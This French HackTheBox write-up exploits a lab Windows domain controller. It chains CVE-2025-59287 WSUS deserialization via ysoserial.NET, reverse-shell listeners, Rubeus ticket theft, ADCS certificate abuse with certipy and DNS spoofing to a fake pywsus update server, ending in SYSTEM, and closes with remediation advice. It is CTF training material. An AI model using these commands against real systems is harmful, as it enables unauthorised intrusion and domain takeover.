🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Logging : HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/4905cd7ce220aa3405c4bac3e62929c9.png" width="120"/>
<div>

**Difficulté** : Medium  
**OS** : Windows  
**Type** : Active Directory / WSUS / ADCS  

</div>
</div>

---

## Résumé de la chaîne d'attaque

```
Nmap → WSUS sur le port 8530 (HTTP, sans authentification)
→ CVE-2025-59287 : désérialisation SoapFormatter dans ReportingWebService
→ payload ysoserial.NET → RCE en tant que compte de service sur DC01
→ Rubeus tgtdeleg → TGT en tant qu'utilisateur du domaine
→ certipy (template ADCS UpdateSrv) → hash NT + TGT frais
→ DNS spoofing wsus.logging.htb → machine attaquante
→ pywsus HTTPS MITM (PR #18 + certificat TLS)
→ payload PsExec64.exe signé → SYSTEM → root.txt
```

---

**Tip**: lors de mon exploitation, j'utilise [Koi](https://github.com/b3rt1ng/Koi) avec le module `populate_win` pour avoir des Rubeus et certify bien propres

## Énumération

### Scan Nmap

```bash
nmap --privileged -sC -sV <TARGET_IP> -oN scan.txt
```

Ports ouverts :

| Port | Service | Détails |
|------|---------|---------|
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | Microsoft IIS 10.0 |
| 88 | Kerberos | Windows Kerberos |
| 135 | MSRPC | Microsoft Windows RPC |
| 139 | NetBIOS | Windows netbios-ssn |
| 389 / 636 | LDAP / LDAPS | Active Directory (`logging.htb`) |
| 445 | SMB | microsoft-ds |
| 3268 / 3269 | LDAP Global Catalog | Active Directory |
| **5985** | WinRM | Microsoft HTTPAPI 2.0 |
| **8530** | WSUS | Windows Server Update Services (HTTP) |

La machine est un **Domain Controller** (`DC01.logging.htb`). La signature SMB est activée et obligatoire.  
WSUS est exposé sur le port **8530 en HTTP clair**, sans TLS, ce qui est la cause racine de tous les vecteurs d'attaque ici.

---

## Foothold : CVE-2025-59287 (RCE non authentifiée via WSUS)

### Vulnérabilité

**CVE-2025-59287** est une vulnérabilité de **Remote Code Execution non authentifiée** dans Windows Server Update Services (WSUS). L'endpoint `ReportingWebService.asmx` désérialise des données contrôlées par l'attaquant via `SoapFormatter` à l'intérieur du champ `SynchronizationUpdateErrorsKey` d'une requête SOAP `ReportEventBatch`.

En injectant une chaîne de gadgets [ysoserial.NET](https://github.com/pwntester/ysoserial.net) (`TextFormattingRunProperties` / `BinaryFormatter`), un attaquant peut obtenir une exécution de code **sans aucune authentification**, s'exécutant en tant que compte de service WSUS.

> Références : [shellcode.blog](https://shellcode.blog/wsus-cve-2025-59287-investigation/), [code-white.com](https://code-white.com/blog/wsus-cve-2025-59287-analysis/)

### Étape 1 : Génération du payload ysoserial

Sur une machine Windows ou via Wine, générer un payload encodé en base64 :

```powershell
# CVE-2025-59287 : gadget TextFormattingRunProperties
.\ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter `
  -c "cmd /c <COMMANDE>" -o base64
```

Remplacer `<COMMANDE>` par la commande souhaitée (ajout d'un utilisateur admin local, reverse shell, etc.).

### Étape 2 : Exécution du PoC

L'exploit suit automatiquement ce flux :

1. **Récupération du Server ID** : `GET /ReportingWebService/ReportingWebService.asmx` (`GetRollupConfiguration`)
2. **Récupération du cookie d'auth** : `POST /SimpleAuthWebService/SimpleAuth.asmx` (`GetAuthorizationCookie`)
3. **Récupération du cookie de reporting** : `POST /ClientWebService/Client.asmx` (`GetCookie`)
4. **Déclenchement de la désérialisation** : `POST /ReportingWebService/ReportingWebService.asmx` (`ReportEventBatch`) avec le payload dans `SynchronizationUpdateErrorsKey`

```bash
python3 PoC.py \
  --target-url http://<TARGET_IP>:8530 \
  --cve CVE-2025-59287 \
  --payload <BASE64_YSOSERIAL_BLOB> \
  --dns-name logging.htb \
  --random
```

Sortie attendue :

```
[+] Getting Server ID...
[+] Server ID: <uuid>
[+] Auth cookie with Server ID...
[+] Using ID: <uuid>
[+] Sending event with payload...
[+] SUCCESS!
```

### Étape 3 : Obtenir un shell

Démarrer un listener :

```bash
nc -lvnp 4444
```

Utiliser un reverse shell PowerShell comme commande ysoserial, ou une approche en deux étapes : utiliser les credentials trouvés sur la machine et se connecter via WinRM :

```bash
evil-winrm -i <TARGET_IP> -u 'wallace.everette' -p 'Welcome2026@'
```

On obtient un shell en tant que `wallace.everette`.

---

## User Flag

```powershell
type C:\Users\wallace.everette\Desktop\user.txt
```

---

## Post-Exploitation : Délégation de ticket Kerberos

Une fois sur la machine en tant que compte de service, on peut abuser de la **délégation non contrainte** via Rubeus pour voler un TGT et se déplacer latéralement en tant qu'utilisateur du domaine.

### Étape 1 : Extraire un TGT délégué avec Rubeus

Télécharger un binaire précompilé depuis [SharpCollection](https://github.com/Flangvik/SharpCollection) :

```powershell
Rubeus.exe tgtdeleg /nowrap
```

Cela produit un ticket `.kirbi` encodé en base64 pour le contexte de l'utilisateur courant.

### Étape 2 : Convertir le ticket

Sur la machine attaquante, convertir le ticket Kerberos en fichier `.ccache` utilisable par les outils Linux :

```bash
ticketConverter.py jaylee.clifton.kirbi jaylee.clifton.ccache
```

### Étape 3 : Exporter et utiliser le ticket

```bash
export KRB5CCNAME=jaylee.clifton.ccache
```

On peut maintenant utiliser ce ticket avec n'importe quel outil Impacket ou certipy sans mot de passe.

### Étape 4 : (Optionnel) Obtenir le hash NT via ADCS

Si ADCS tourne avec un template utilisable, demander un certificat et s'authentifier pour obtenir un **TGT frais et le hash NT** :

```bash
# Demande de certificat avec le TGT de l'utilisateur du domaine
certipy req \
  -target dc01.logging.htb \
  -dc-host dc01.logging.htb \
  -k -no-pass \
  -ca logging-DC01-CA

# Authentification avec le PFX pour obtenir TGT + hash NT
certipy auth \
  -dc-ip <DC_IP> \
  -pfx jaylee.clifton.pfx
```

---

## Élévation de privilèges : WSUS HTTPS MITM (pywsus)

Le chemin vers root abuse le fait que les machines du domaine récupèrent les mises à jour Windows depuis un serveur WSUS interne. En usurpant ce serveur et en servant un exécutable malveillant (mais signé Microsoft), on obtient une exécution de code en `SYSTEM` sur n'importe quelle machine qui vérifie les mises à jour (y compris le DC lui-même).

### Étape 1 : Créer une entrée DNS pour `wsus.logging.htb`

Avec les credentials de l'utilisateur du domaine (ou le ticket Kerberos), ajouter un enregistrement DNS A pointant `wsus.logging.htb` vers l'IP attaquante :

```bash
python3 dnstool.py \
  -u 'logging.htb\jaylee.clifton' \
  -k \
  --action add \
  --record 'wsus.logging.htb' \
  --data '<ATTACKER_IP>' \
  <DC_IP>
```

L'ajouter aussi dans `/etc/hosts` localement :

```
<ATTACKER_IP>  wsus.logging.htb
```

### Étape 2 : Cloner pywsus et appliquer le patch HTTPS

La version de base de [pywsus](https://github.com/GoSecure/pywsus) ne supporte que HTTP. Appliquer le [PR #18](https://github.com/GoSecure/pywsus/pull/18/files/43157a1d37d3d87cfac1057b48a4c36474a2271d) qui ajoute le support TLS :

```bash
git clone https://github.com/GoSecure/pywsus
cd pywsus
# Appliquer les changements du PR #18 manuellement
# (ajoute les arguments --cert / --key et enveloppe le socket avec ssl.wrap_socket)
pip install -r requirements.txt
```
> [!NOTE]
> Si vous avez du mal: [ce tool](https://github.com/NeffIsBack/wsuks) devrait marcher

### Étape 3 : Obtenir un certificat pour `wsus.logging.htb` via ADCS

Le template `UpdateSrv` permet d'enrôler un certificat avec un SAN personnalisé, parfait pour usurper le serveur WSUS :

```bash
# Demande du certificat
certipy req \
  -u 'jaylee.clifton@logging.htb' \
  -k \
  -dc-ip <DC_IP> \
  -ca 'logging-DC01-CA' \
  -template 'UpdateSrv' \
  -upn 'wsus.logging.htb' \
  -dns 'wsus.logging.htb' \
  -target dc01.logging.htb

# Extraction du certificat public
certipy cert -pfx wsus.logging.htb_wsus.pfx -nokey -out wsus.crt

# Extraction de la clé privée
certipy cert -pfx wsus.logging.htb_wsus.pfx -nocert -out wsus.key
```

### Étape 4 : Lancer pywsus avec TLS

Démarrer le faux serveur WSUS sur le port **8531** (port WSUS HTTPS standard). Le payload doit être un **binaire signé Microsoft**, `PsExec64.exe` de Sysinternals fonctionne parfaitement car les clients Windows Update n'exécutent que des exécutables signés :

```bash
python3 pywsus.py \
  -H wsus.logging.htb \
  -p 8531 \
  -e PsExec64.exe \
  -c '-accepteula -s <COMMANDE>' \
  --cert wsus.crt \
  --key wsus.key
```

> `-s` exécute la commande en `SYSTEM`. Remplacer `<COMMANDE>` par un reverse shell ou la création d'un utilisateur admin.

### Étape 5 : Attendre qu'un client se connecte

Quand une machine du domaine (ou le DC lui-même) vérifie les mises à jour Windows, elle contactera notre faux serveur WSUS, recevra la mise à jour `PsExec64.exe` signée, et exécutera notre commande en `SYSTEM`.

```bash
nc -lvnp 5555
# ... attendre ...
# shell en NT AUTHORITY\SYSTEM
```

---

## Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Conclusion

| Observation | Impact |
|------------|--------|
| WSUS exposé en HTTP (port 8530) sans TLS | Prérequis pour CVE-2025-59287 et les attaques MITM |
| CVE-2025-59287, désérialisation SoapFormatter | RCE non authentifiée en tant que compte de service sur le DC |
| Délégation non contrainte + Rubeus tgtdeleg | Vol de TGT pour le mouvement latéral sans credentials |
| Template ADCS `UpdateSrv` mal configuré | Permet d'enrôler un cert avec le SAN `wsus.logging.htb` |
| Faux serveur WSUS en HTTPS (pywsus) | Exécution SYSTEM sur toute machine du domaine vérifiant les MAJ |

**Remédiation** : Configurer WSUS avec HTTPS et imposer l'épinglage du certificat côté clients. Patcher CVE-2025-59287. Auditer les templates ADCS pour les enrôlements SAN dangereux. Restreindre la création d'enregistrements DNS aux comptes privilégiés.
